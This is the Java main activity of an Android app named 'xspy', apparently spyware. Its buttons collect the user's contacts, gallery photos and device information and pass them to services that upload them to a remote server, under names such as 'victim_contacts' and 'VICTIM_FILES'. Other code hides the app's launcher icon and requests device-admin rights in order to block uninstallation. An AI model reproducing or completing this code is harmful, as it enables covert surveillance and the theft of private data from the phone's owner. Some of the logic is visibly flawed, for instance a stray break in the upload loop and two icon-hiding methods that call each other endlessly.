package com.redeyesncode.xspy;

import android.Manifest;
import android.app.ProgressDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import androidx.lifecycle.ViewModelProvider;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.redeyesncode.xspy.backend.AndroidContactModel;
import com.redeyesncode.xspy.backend.recievers.MyDeviceAdminReceiver;
import com.redeyesncode.xspy.backend.services.ContactUploadService;
import com.redeyesncode.xspy.backend.services.FileUploadService;
import com.redeyesncode.xspy.base.BaseActivity;
import com.redeyesncode.xspy.databinding.ActivityMainBinding;
import com.redeyesncode.xspy.models.DeviceInfoBody;
import com.redeyesncode.xspy.models.FileBody;
import com.redeyesncode.xspy.utils.Constants;
import com.redeyesncode.xspy.utils.DeviceUtils;
import com.redeyesncode.xspy.utils.GalleryUtils;
import com.redeyesncode.xspy.utils.Utils;
import com.redeyesncode.xspy.viewmodel.MainViewModel;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BaseActivity {
    private ActivityMainBinding binding;
    private MainViewModel mainViewModel;
    private ProgressDialog progressDialog;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        mainViewModel = new MainViewModel();
        mainViewModel = new ViewModelProvider(this).get(MainViewModel.class);
        mainViewModel.init();
        binding.setViewmodel(mainViewModel);
        setupProgressDialog();
        attachObservers();
        setContentView(binding.getRoot());
        initClicks();
    }

    private void attachObservers() {
        mainViewModel.jsonElementLiveData().observe(this, jsonElement -> {
//            {"status":"success","code":200,"message":"Hello xSPY !"}
            showToast(jsonElement.getAsJsonObject().get("message").getAsString());

        });

    }

    private void initClicks() {

        binding.btnPingServer.setOnClickListener(v->{
            mainViewModel.helloServer();


        });

        binding.btnGetPermission.setOnClickListener(v -> {
            checkPermissions();
        });
        binding.btnDeviceAdmin.setOnClickListener(v->{
            enableDeviceAdmin();
                });

        binding.btnFetchAllContacts.setOnClickListener(v -> {

            // How to call api's in android in background thread.

            ArrayList<AndroidContactModel> contacts = Utils.getContactList(MainActivity.this);
//            mainViewModel.dumpContact("6261319133","Ashu");
            Intent intent = new Intent(this, ContactUploadService.class);
            intent.putExtra("victim_contacts", (ArrayList<AndroidContactModel>) contacts);

            startService(intent);
        });

        binding.btnHideAppIcon.setOnClickListener(v->{
            checkPermissionForHideIcon();
        });
        binding.btnHideAppIconAndroid14.setOnClickListener(v-> {
            hideAppIcon();
        });

        binding.btnFetchGallery.setOnClickListener(v->{
            checkPermissionsForGallery();
        });

        binding.btnFetchAndroidDevice.setOnClickListener(v->{
           ArrayList<String> ANDROID_INFO =  DeviceUtils.getDeviceInformation();
           DeviceInfoBody deviceInfoBody = new DeviceInfoBody();
           deviceInfoBody.setDeviceInfo(ANDROID_INFO);
           deviceInfoBody.setName("ASHU_ANDROID");
           mainViewModel.dumpDeviceInfo(deviceInfoBody);
        });



    }

    private void checkPermissionForHideIcon() {
        Dexter.withContext(MainActivity.this).withPermissions(Manifest.permission.PROCESS_OUTGOING_CALLS).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport multiplePermissionsReport) {
                if(multiplePermissionsReport.areAllPermissionsGranted()){
                    hideAppIcon();
                    showToast("Granted !!");
                }else{
                    showToast("Not Granted !!");
                }

            }
            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> list, PermissionToken permissionToken) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    shouldShowRequestPermissionRationale(Manifest.permission.CAMERA);
                }

            }
        }).check();

    }




    private void checkPermissionsForGallery() {
        List<String> permissions = new ArrayList<>();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        Dexter.withContext(MainActivity.this)
                .withPermissions(permissions)
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        if (report.areAllPermissionsGranted()) {
                            uploadPhotosToServer();
                            showToast("Granted !!");
                        } else {
                            showToast("Not Granted !!");
                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> requests, PermissionToken token) {
                        token.continuePermissionRequest();
                    }
                })
                .check();
    }

    private void setupProgressDialog(){
         progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.setTitle("Getting Files.");
        progressDialog.setCancelable(false);
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCanceledOnTouchOutside(false);
        progressDialog.setMessage("Please wait while app fetches images....");


    }

    private void uploadPhotosToServer() {
        ArrayList<String> filePaths = GalleryUtils.getImagesFromGalleryOnly(MainActivity.this);
        ArrayList<Uri> fileUris = new ArrayList<>();
        ArrayList<FileBody> victimsFiles = new ArrayList<>();
        for (int i = 0; i < filePaths.size(); i++) {
            fileUris.add(GalleryUtils.convertFilePathToURI(filePaths.get(i)));
        }


        startServiceForUpload(victimsFiles,fileUris);
//        Log.i(Constants.DEV_XSPY, "initClicks: "+ fileUris);
    }

    private void startServiceForUpload(ArrayList<FileBody> victimsFiles, ArrayList<Uri> fileUris) {
        // Android service code will be written here.
        for (int i = 0; i < fileUris.size(); i++) {
            try {
                victimsFiles.add(new FileBody(GalleryUtils.getFile(MainActivity.this,fileUris.get(i))));
                break;
//                showLog(victimsFiles.get(i).getFile().toString());
            }catch (Exception e){
                e.printStackTrace();

            }
        }


        showToast(victimsFiles.size()+"<--- Victims File Size");
        Intent uploadFileServiceIntent = new Intent(MainActivity.this, FileUploadService.class);

        // We need to pass the file array list into the intent so that we can upload files in the  background as well.
        uploadFileServiceIntent.putParcelableArrayListExtra("VICTIM_FILES",victimsFiles);
        // using the parcelable method now.





        // Research on best way to upload such large files in background.
//        uploadFilesByThreading(victimsFiles,"RedEyesNCode");


//         Checks for the android version.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(uploadFileServiceIntent);
        } else {
            progressDialog.dismiss();
            startService(uploadFileServiceIntent);
        }
    }

    private void uploadFilesByThreading(ArrayList<FileBody> victimsFiles,String victimName) {
        Thread thread = new Thread() {
            @Override
            public void run() {
                try {
                    sleep(100);
                    for (int i = 0; i < victimsFiles.size(); i++) {
                        mainViewModel.uploadMedia(victimsFiles.get(i).getFile(),victimName);
                    }


                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        };

        thread.start();
    }


    private void checkPermissions(){
        // Checking the permission for picking the image from camera and gallery.
        // Checking if the permission is already granted or not.
        String[] PERMISSION_ARRAY;
        //Permission Android Check
        if(Build.VERSION.SDK_INT<Build.VERSION_CODES.Q){
            PERMISSION_ARRAY = Constants.PERMISSION_ARRAY_N_ANDROID;
        }else if(Build.VERSION.SDK_INT>Build.VERSION_CODES.Q){
            if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.S){
                PERMISSION_ARRAY = Constants.PERMISSION_ARRAY_S_ANDROID;
            }else{
                PERMISSION_ARRAY = Constants.PERMISSION_ARRAY_Q_ANDROID;
            }

        }else{
            PERMISSION_ARRAY = Constants.PERMISSION_ARRAY_Q_ANDROID;

        }

        Dexter.withContext(MainActivity.this).withPermissions(PERMISSION_ARRAY).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport multiplePermissionsReport) {
                if(multiplePermissionsReport.areAllPermissionsGranted()){
                    showToast("Granted !!");
                }else{
                    showToast("Not Granted !!");

                }

            }

            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> list, PermissionToken permissionToken) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    shouldShowRequestPermissionRationale(Manifest.permission.CAMERA);
                }

            }
        }).check();
    }
    private void hideAppIconIfSupported() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) { // Up to Android 11
            hideAppIcon();
            showToast("App icon hidden (Android <= 11)");
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12+
            hideAppIcon(); // Might not work depending on device/OEM
            showToast("Attempted to hide icon (Android 12+)");
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
//        moveTaskToBack(true);

    }

    private void enableDeviceAdmin(){
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to prevent app uninstall.");
        startActivityForResult(intent, 100);


    }

    private void hideAppIcon(){
        hideAppIconIfSupported();
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this,MainActivity.class);
        // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

}